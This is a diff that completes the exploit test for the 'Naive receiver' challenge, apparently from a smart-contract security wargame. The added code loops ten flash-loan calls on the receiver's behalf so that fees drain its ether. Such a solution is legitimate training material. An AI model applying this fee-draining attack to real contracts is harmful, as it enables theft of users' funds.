@@ -29,8 +29,16 @@ describe('[Challenge] Naive receiver', function () {
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+    it("Exploit", async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        for (let index = 0; index < 10; index++) {
+          await this.pool
+            .connect(attacker)
+            .flashLoan(
+              this.receiver.address,
+              ETHER_IN_RECEIVER.sub(await this.pool.fixedFee())
+            );
+        }
     });
 
     after(async function () {
